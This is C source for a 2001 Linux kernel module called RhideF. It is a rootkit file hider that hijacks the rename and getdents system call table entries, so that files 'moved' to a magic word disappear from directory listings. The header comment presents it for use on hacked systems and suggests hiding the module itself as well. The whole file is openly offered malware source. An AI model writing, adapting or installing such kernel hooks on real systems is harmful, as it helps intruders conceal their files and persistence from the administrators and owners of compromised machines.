/*
 * TILE: RhideF v1.0 <10/5/2001>
 *
 * CODER: Ripe - <ripe@7a69ezine.org>
 *
 * DESCR: This is a file hider LKM. You'll be able ro hide/unhide files
 *        using a simple "mv" command. When you insert the module you can
 *        to specify the magic words to insert and delete file in hide
 *        list.
 *
 *        root@donasec.com ~# insmod rhidef.o ins=mete del=saca [-f]
 *        root@donasec.com ~#
 *
 *        You'll hide a file using "mv <file> mete" and unhide it using
 *        "mv <file> saca". Easy.
 *
 * RECOM: If you use this LKM in a hacked system I recomend revise the
 *        source (script-kidiie sux) and hider this LKM using hider.c :)
 *
 * TESTED: This LKM have been tested without problems on:
 *           - Linux Kernel 2.2.18pre10 (Debian 2.2)
 *           - Linux Kernel 2.2.18 (Debian 2.2)
 */
#define __KERNEL__
#define MODULE

#include <linux/ctype.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>

#include <linux/proc_fs.h>
#include <linux/dirent.h>

#include <sys/syscall.h>

#define _7A69SOFT_
#define CODER       "Ripe"

#define DEF_INS     "insert_file"
#define DEF_DEL     "delete_file"

extern void *sys_call_table[];

char *ins;
char *del;

struct {
  char *ins;
  char *del;
} status;

typedef struct {
  char *file;
  struct lfile *next;
} lfile;

lfile *f_list;

int (*o_rename)(const char *oldpath, const char *newpath);
int (*o_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

void my_bzero(char *buf, int size) {
  memset(buf, 0, size);
}

void add_file(char *file) {
  lfile *ptr=f_list;
#ifdef DEBUGMODE
  printk("(RF) Adding %s file to hide list\n", file);
#endif
  if (is_file(file)==1) return;
  if (ptr) {
    while (ptr->next) {
      if (!strcmp(ptr->file, file)) return;
      ptr=(lfile *)ptr->next;
    }
    ptr->next=(struct lfile *)kmalloc(sizeof(lfile), GFP_KERNEL);
    ptr=(lfile *)ptr->next;
    ptr->file=(char *)kmalloc(strlen(file)+1, GFP_KERNEL);
    strcpy(ptr->file, file);
    ptr->next=NULL;
  } else {
    f_list=(lfile *)kmalloc(sizeof(lfile), GFP_KERNEL);
    ptr=f_list;
    ptr->file=(char *)kmalloc(strlen(file)+1, GFP_KERNEL);
    strcpy(ptr->file, file);
    ptr->next=NULL;
  }
  return;
}

void del_file(char *file) {
  lfile *ptr=f_list, *ptr2;
#ifdef DEBUGMODE
  printk("(RF) Deleting %s file from hide list\n", file);
#endif
  if (!ptr) return;
  if (!strcmp(ptr->file, file)) {
    f_list=(lfile *)ptr->next;
    kfree(ptr->file);
    kfree(ptr);
    return;
  }
  while(ptr) {
    if (!strcmp(ptr->file, file)) break;
    ptr2=ptr;
    ptr=(lfile *)ptr->next;
  }
  if (ptr) {
    ptr2->next=ptr->next;
    kfree(ptr->file);
    kfree(ptr);
  }
  return;
}

int is_file(char *file) {
  lfile *ptr=f_list;
  while(ptr) {
    if (!strcmp(ptr->file, file)) return(1);
    ptr=(lfile *)ptr->next;
  }
  return(0);
}

int my_rename(const char *oldpath, const char *newpath) {
  if (!strcmp(newpath, status.ins)) {
    add_file((char *)oldpath);
    return(0);
  }
  if (!strcmp(newpath, status.del)) {
    del_file((char *)oldpath);
    return(0);
  }
  return((*o_rename)(oldpath, newpath));
}

int my_getdents(unsigned int fd, struct dirent *dirp, unsigned int count) {
  int ret=0;
  int o_ret=(*o_getdents)(fd, dirp, count);
  int tmp=0;
  struct task_struct *task;
  struct dirent *dirp_cpy, *dirp_ret, *dirp_cpy2, *dirp_ret2;
  if (o_ret<=0) return(o_ret);
  dirp_cpy=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
  dirp_ret=(struct dirent *)kmalloc(o_ret, GFP_KERNEL);
  __generic_copy_from_user(dirp_cpy, dirp, o_ret);
  my_bzero((char *)dirp_ret, o_ret);
  __generic_copy_to_user(dirp, dirp_ret, o_ret);
  dirp_cpy2=dirp_cpy;
  dirp_ret2=dirp_ret;
  while (tmp<o_ret) {
    tmp=tmp+dirp_cpy2->d_reclen;
    if (dirp_cpy2->d_reclen==0) break;
    if (is_file(dirp_cpy2->d_name)==0) {
      memcpy(dirp_ret2, dirp_cpy2, dirp_cpy2->d_reclen);
      ret=ret+dirp_cpy2->d_reclen;
      dirp_ret2=(struct dirent *)((char *)dirp_ret2+dirp_cpy2->d_reclen);
    }
    dirp_cpy2=(struct dirent *)((char *)dirp_cpy2+dirp_cpy2->d_reclen);
  }
  __generic_copy_to_user(dirp, dirp_ret, ret);
  kfree(dirp_cpy);
  kfree(dirp_ret);
  return(ret);
}

int init_module() {
  status.ins=(char *)kmalloc(strlen(DEF_INS), GFP_KERNEL);
  status.del=(char *)kmalloc(strlen(DEF_DEL), GFP_KERNEL);
  strcpy(status.ins, DEF_INS);
  strcpy(status.del, DEF_DEL);
  if (ins) {
    kfree(status.ins);
    status.ins=ins;
  }
  if (del) {
    kfree(status.del);
    status.del=del;
  }
  o_rename=sys_call_table[__NR_rename];
  o_getdents=sys_call_table[__NR_getdents];
  sys_call_table[__NR_rename]=my_rename;
  sys_call_table[__NR_getdents]=my_getdents;
#ifdef DEBUGMODE
  printk("(RF) RhideF by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RF) Loaded!\n");
#endif
  return(0);
}
void cleanup_module() {
  sys_call_table[__NR_rename]=o_rename;
  sys_call_table[__NR_getdents]=o_getdents;
#ifdef DEBUGMODE
  printk("(RF) RhideF by Ripe - <ripe@7a69ezine.org>\n");
  printk("(RF) UnLoaded!\n");
#endif
}

MODULE_AUTHOR("Ripe - <ripe@7a69ezine.org>");
MODULE_DESCRIPTION("hack: File hider");
MODULE_PARM(ins, "s");
MODULE_PARM(del, "s");
